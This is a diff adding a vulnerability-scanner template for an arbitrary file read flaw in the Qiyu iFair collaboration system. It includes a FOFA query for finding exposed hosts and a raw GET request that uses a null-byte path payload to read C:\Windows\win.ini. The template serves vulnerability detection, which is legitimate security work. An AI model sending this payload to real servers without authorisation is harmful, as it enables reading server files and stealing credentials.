@@ -1,0 +1,26 @@
+id: qiyu-ifair-getuploadimagejsp-arbitrary-file-read
+
+info:
+  name: "企语iFair协同管理系统getuploadimage.jsp接口任意文件读取漏洞"
+  author: 0dayPoc
+  severity: medium
+  description: |-
+    fofa: app:"企语 iFair"
+    企语iFair协同管理系统中的getuploadimage.jsp接口存在文件读取漏洞，攻击者可通过构造恶意请求绕过身份验证机制，读取服务器任意路径文件内容。该缺陷允许未经授权的访问者获取系统配置文件、数据库凭证等敏感数据，导致企业内部信息泄露和系统完整性受损。
+  tags: 企语iFair
+
+http:
+- raw:
+  - |
+    GET /oa/common/components/upload/getuploadimage.jsp?imageURL=C:\Windows\win.ini%00.jpg HTTP/1.1
+    Host: {{Hostname}}
+    Connection: close
+    Accept-Encoding: gzip, deflate, br
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - "for 16-bit app support"
